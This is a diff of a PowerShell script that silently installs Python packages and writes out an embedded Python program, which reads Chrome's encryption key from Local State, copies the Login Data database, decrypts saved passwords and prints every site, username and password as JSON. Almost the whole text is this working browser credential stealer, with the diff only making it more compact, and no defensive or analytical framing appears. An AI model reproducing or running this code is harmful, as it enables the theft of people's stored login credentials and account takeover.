@@ -1,96 +1,50 @@
 $ErrorActionPreference = 'Stop'
 
-# 1. Check Python
+# Check Python
 try { python --version >$null 2>&1 } catch { 
     Write-Host "⚠️ Install Python first: https://python.org"
     exit 
 }
 
-# 2. Install requirements
+# Install requirements
 python -m pip install --upgrade pip >$null 2>&1
 python -m pip install pycryptodome pypiwin32 requests >$null 2>&1
 
-# 3. Python script with fixed filename handling
+# Minimal Python script
 $pythonCode = @'
-import os
-import json
-import sqlite3
-import base64
-import win32crypt
+import os, json, sqlite3, base64, win32crypt
 from Crypto.Cipher import AES
-import shutil
-from datetime import datetime, timedelta
-import uuid
+import shutil, uuid
 
-def get_chrome_datetime(chromedate):
-    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
-
-def decrypt_password(password, key):
+def decrypt(password, key):
     try:
-        iv = password[3:15]
-        password = password[15:]
-        cipher = AES.new(key, AES.MODE_GCM, iv)
-        return cipher.decrypt(password)[:-16].decode()
+        iv, password = password[3:15], password[15:]
+        return AES.new(key, AES.MODE_GCM, iv).decrypt(password)[:-16].decode()
     except:
-        try:
-            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
-        except:
-            return ""
+        try: return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
+        except: return ""
 
 def main():
     try:
-        # Generate random filename in Python
-        filename = f"ChromeData_{uuid.uuid4().hex}.db"
+        db_file = f"chrome_{uuid.uuid4().hex}.db"
+        with open(os.path.join(os.environ["LOCALAPPDATA"],"Google","Chrome","User Data","Local State"),"r") as f:
+            key = win32crypt.CryptUnprotectData(base64.b64decode(json.loads(f.read())["os_crypt"]["encrypted_key"])[5:],None,None,None,0)[1]
         
-        local_state_path = os.path.join(os.environ["LOCALAPPDATA"], 
-                                      "Google", "Chrome", 
-                                      "User Data", "Local State")
-        with open(local_state_path, "r", encoding="utf-8") as f:
-            local_state = json.loads(f.read())
-        
-        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
-        key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
-        
-        db_path = os.path.join(os.environ["LOCALAPPDATA"], 
-                             "Google", "Chrome", 
-                             "User Data", "default", "Login Data")
-        shutil.copyfile(db_path, filename)
-        
-        db = sqlite3.connect(filename)
-        cursor = db.cursor()
-        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-        
-        results = []
-        for row in cursor.fetchall():
-            url = row[0]
-            username = row[1]
-            password = row[2]
-            decrypted_password = decrypt_password(password, key)
-            if username or decrypted_password:
-                results.append({
-                    "url": url,
-                    "username": username,
-                    "password": decrypted_password
-                })
-        
-        print(json.dumps(results, indent=4))
+        shutil.copyfile(os.path.join(os.environ["LOCALAPPDATA"],"Google","Chrome","User Data","default","Login Data"), db_file)
+        db = sqlite3.connect(db_file)
+        results = [{"url":r[0],"username":r[1],"password":decrypt(r[2],key)} for r in db.cursor().execute("SELECT origin_url,username_value,password_value FROM logins") if r[1] or r[2]]
+        print(json.dumps(results))
     except Exception as e:
-        print(f'{{"error": "{str(e)}"}}')
+        print(f'{{"error":"{str(e)}"}}')
     finally:
-        try:
-            cursor.close()
-            db.close()
-            if os.path.exists(filename):
-                os.remove(filename)
-        except:
-            pass
+        try: os.remove(db_file)
+        except: pass
 
-if __name__ == "__main__":
-    main()
+if __name__ == "__main__": main()
 '@
 
-# 4. Execute with cleanup
-$tempFile = "$env:TEMP\chrome_passwords.py"
+# Execute
+$tempFile = "$env:TEMP\pw.py"
 try {
     [System.IO.File]::WriteAllText($tempFile, $pythonCode)
     python $tempFile
